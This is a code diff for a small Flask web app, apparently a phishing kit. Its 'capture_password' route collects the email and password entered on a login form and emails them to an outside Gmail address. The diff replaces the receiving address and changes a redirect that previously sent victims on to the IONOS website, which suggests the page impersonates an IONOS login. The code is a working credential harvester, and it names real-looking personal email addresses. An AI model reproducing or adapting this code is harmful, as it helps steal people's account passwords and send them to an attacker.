@@ -31,7 +31,7 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient = 'smartdevtechemail@gmail.com'  # Your email address to receive the email
+        recipient = 'robhh001@gmail.com'  # Your email address to receive the email
         subject = 'Login'
         body = f'Email: {email}\nPassword entered: {password}'
 
@@ -46,7 +46,7 @@ def capture_password():
 
 @app.route('/redirect')
 def external_redirect():
-    return redirect('https://www.ionos.de/')
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
     app.run(debug=True)
